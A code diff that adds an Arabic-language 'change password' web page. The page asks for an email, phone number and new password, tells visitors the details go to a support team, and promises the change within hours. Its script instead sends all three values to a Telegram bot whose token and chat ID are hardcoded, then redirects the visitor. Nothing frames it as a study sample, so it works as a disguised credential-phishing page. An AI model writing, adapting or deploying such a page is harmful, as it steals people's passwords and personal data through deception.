@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تغيير كلمة المرور</title>
+  <style>
+    @font-face {
+      font-family: 'arabic';
+      src: url('arabic.ttf') format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    * {
+      font-family: 'arabic', sans-serif;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(135deg, #008983, #2a5298);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      min-height: 100vh;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+      max-width: 400px;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 12px;
+    }
+
+    input {
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 12px;
+      background-color: #00c4cc;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #00a0a6;
+    }
+
+    .note {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+      opacity: 0.9;
+    }
+
+    /* Popup styles */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(8px);
+      background-color: rgba(0, 0, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .popup-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .popup {
+      background: white;
+      color: #222;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 300px;
+      font-size: 16px;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>تغيير كلمة المرور</h2>
+
+  <form id="changeForm">
+    <input type="email" id="email" placeholder="ادخل بريدك الإلكتروني" required>
+    <input type="tel" id="phone" placeholder="ادخل رقم الهاتف" required>
+    <input type="password" id="newPassword" placeholder="ادخل كلمة المرور الجديدة" required>
+    <button type="submit">إجراء التغيير</button>
+  </form>
+
+  <div class="note">سوف يتم إرسال التفاصيل إلى فريق الدعم</div>
+
+  <!-- Popup -->
+  <div class="popup-overlay" id="popup">
+    <div class="popup">
+      سيتم تغيير كلمة المرور خلال بضع ساعات<br>
+      ويمكنك العودة وتسجيل الدخول إلى حسابك بكل أمان
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('changeForm');
+    const popup = document.getElementById('popup');
+    const chatId = "6431271423";
+    const token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phone').value;
+      const newPassword = document.getElementById('newPassword').value;
+
+      const message = `
+<b>طلب تغيير كلمة المرور</b>
+<b>البريد الإلكتروني:</b> ${email}
+<b>رقم الهاتف:</b> ${phone}
+<b>كلمة المرور الجديدة:</b> ${newPassword}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      }).then(response => {
+        if (response.ok) {
+          popup.classList.add('active');
+          setTimeout(() => {
+            window.location.href = "index.html";
+          }, 8000);
+        } else {
+          alert("حدث خطأ أثناء الإرسال.");
+        }
+      }).catch(error => {
+        console.error('Error:', error);
+        alert("تعذر الاتصال بالخادم.");
+      });
+    });
+  </script>
+
+</body>
+</html>
